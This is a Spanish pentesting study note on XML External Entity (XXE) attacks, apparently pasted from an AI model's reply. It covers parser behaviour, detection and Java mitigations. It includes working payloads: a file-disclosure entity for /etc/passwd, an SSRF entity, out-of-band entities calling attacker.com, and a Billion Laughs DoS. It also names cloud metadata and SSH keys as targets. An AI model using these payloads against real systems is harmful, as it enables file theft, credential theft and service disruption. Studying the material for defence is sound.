---
title: "Xxe"
date: 2026-01-26
tags:
  - ciberseguridad
  - herramientas
---
¡Excelente! Vamos a preparar unas **notas densas, extensas y muy técnicas** sobre **XXE (XML External Entity)** para que puedas usarlas como referencia avanzada en tus apuntes de pentesting.

---

###  **XXE (XML External Entity)**


> **Relacionado**: [[01-Ciberseguridad/Fundamentos/owasp|owasp]]. [[01-Ciberseguridad/Fundamentos/SSRF|SSRF]]. [[01-Ciberseguridad/Herramientas/IDOR|IDOR]]. [[01-Ciberseguridad/Malware/Apuntes|Apuntes]]. [[02-Ciencias-Computacion/IA/Notas|Notas]].

####  **Definición formal**

- **XXE = XML External Entity Attack**
    
- Vulnerabilidad que ocurre cuando una aplicación **procesa documentos XML no seguros y permite la definición y resolución de entidades externas**, lo que puede llevar a:
    
    - **Exposición de archivos locales (`file disclosure`).**
        
    - **Ejecución de solicitudes SSRF (`Server-Side Request Forgery`).**
        
    - **Denegación de servicio (`DoS`).**
        
    - **Robo de credenciales (`/etc/passwd`, `AWS credentials` en entornos cloud).**
        

---

####  **Contexto técnico**

- XML permite definir entidades mediante `<!ENTITY>` para reutilización de texto:
    
    ```xml
    <!ENTITY ejemplo "Contenido reusable">
    ```
    
- **Entidades externas permiten cargar datos desde archivos o recursos remotos**:
    
    ```xml
    <!ENTITY ext SYSTEM "file:///etc/passwd">
    ```
    

 Si un parser XML **no restringe entidades externas**, un atacante puede forzar al servidor a resolver entidades peligrosas → filtrado de datos internos o interacción con recursos locales/remotos.

---

####  **Ejemplo básico de payload XXE**

1️⃣ Supongamos un servicio que recibe XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>Juan</name>
</user>
```

2️⃣ Un atacante lo manipula:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>
  <name>&xxe;</name>
</user>
```

 Si el parser XML evalúa `&xxe;` como entidad externa, devolverá el contenido de `/etc/passwd`.

---

####  **Tipos de XXE según impacto**

 **Exfiltración de archivos locales:**

- Acceso a ficheros como `/etc/passwd`, `.ssh/id_rsa`, `config.php`, etc.
    

 **SSRF mediante XXE:**

- Forzar al parser a solicitar datos de servicios internos:
    
    ```xml
    <!ENTITY xxe SYSTEM "http://localhost:8080/internal-api">
    ```
    

 **Ataques out-of-band (Blind XXE):**

- Si la respuesta no revela datos directamente pero el servidor puede hacer solicitudes hacia el atacante:
    
    ```xml
    <!ENTITY xxe SYSTEM "http://attacker.com/leak">
    ```
    

 **Denegación de servicio:**

- **"Billion Laughs Attack"** (ataque de amplificación exponencial):
    
    ```xml
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    ]>
    <root>&lol2;</root>
    ```
    
    ️ Explota expansión exponencial de entidades, provocando alto consumo de memoria.
    

---

####  **Comportamiento según lenguaje/plataforma**

|Tecnología|Comportamiento por defecto|
|---|---|
|**Java (XML parsers antiguos)**|Vulnerable (no protegen entidades externas por defecto).|
|**.NET (XmlDocument)**|Vulnerable salvo configuración segura explícita.|
|**Python (lxml, xml.etree)**|Vulnerable dependiendo del parser usado.|
|**PHP (libxml2)**|Vulnerable si `libxml_disable_entity_loader(false)` está activo.|
|**Node.js (xml2js, fast-xml-parser)**|Depende de configuración → algunos seguros por defecto.|

---

####  **Cómo detectar XXE en pentesting**

 **Metodología:**

- Identificar entradas donde la app procese XML:
    
    - Web Services SOAP.
        
    - APIs REST que acepten `application/xml`.
        
    - Formularios que suban archivos `.xml`.
        
    - SAML authentication (SSO).
        
- Testeo básico:
    
    - Inyectar payload mínimo:
        
        ```xml
        <!DOCTYPE test [<!ENTITY xxe "TestXXE"> ]>
        <foo>&xxe;</foo>
        ```
        
    - Comprobar si aparece `TestXXE` en la respuesta.
        
- Testeo avanzado:
    
    - **File disclosure:**
        
        ```xml
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <foo>&xxe;</foo>
        ```
        
    - **Out-of-Band / Blind:**
        
        ```xml
        <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/poc"> %xxe; ]>
        ```
        

 **Herramientas útiles:**

- Burp Suite (extensión **Burp Collaborator** es ideal para Blind XXE).
    
- OWASP ZAP.
    
- Manual testing con `curl` y payloads adaptados.
    

---

####  **Impacto**

 **Gravedad alta a crítica dependiendo del contexto:**

- Robo de credenciales internas (`AWS instance metadata` → `http://169.254.169.254/latest/meta-data/`).
    
- Acceso a ficheros sensibles (`/etc/shadow`, `db_config.php`).
    
- Bypass de seguridad vía SSRF → pivotar internamente.
    
- DoS mediante ataques de amplificación (`Billion Laughs`).
    

---

####  **Mitigaciones robustas**

 **Mejores prácticas defensivas:**  
 **Configurar el parser XML para deshabilitar:**

- Resolución de entidades externas (`external entity resolution`).
    
- Procesamiento de `DOCTYPE`.
    

 **Ejemplo en Java (SAXParserFactory):**

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

 **Filtrar `Content-Type`:**

- Si no esperas XML, rechazar `application/xml`.
    

 **Validar XML contra esquemas seguros (XSD):**

- Definir y controlar estructura esperada del XML.
    

 **Monitorización:**

- Detectar patrones anómalos de uso de entidades y resoluciones externas en logs.
    

---

####  **Referencias clave**

-  **OWASP Top 10 2017 → A4:2017 XML External Entities (XXE)**:
    
    - Clasificó XXE como vulnerabilidad crítica frecuente.
        
- En **OWASP Top 10 2021**, XXE está subsumida dentro de **A05:2021 – Security Misconfiguration** pero sigue vigente como amenaza.
    

---

 **Resumen denso para recordar:**

>  **XXE = ataque que explota parsers XML mal configurados para forzar resolución de entidades externas → acceso a archivos locales, SSRF, filtrado de datos o DoS.**  
>  Vulnerabilidad muy crítica en APIs SOAP, SAML SSO, apps que aceptan XML, y parsers antiguos/configurados por defecto.

---

 **Si quieres puedo prepararte:**

-  **Checklist paso a paso para detectar y explotar XXE en auditorías reales.**
    
-  **Guía con ejemplos de mitigación en múltiples lenguajes (Java, Python, PHP, .NET).**
    

Solo dime  y lo preparo.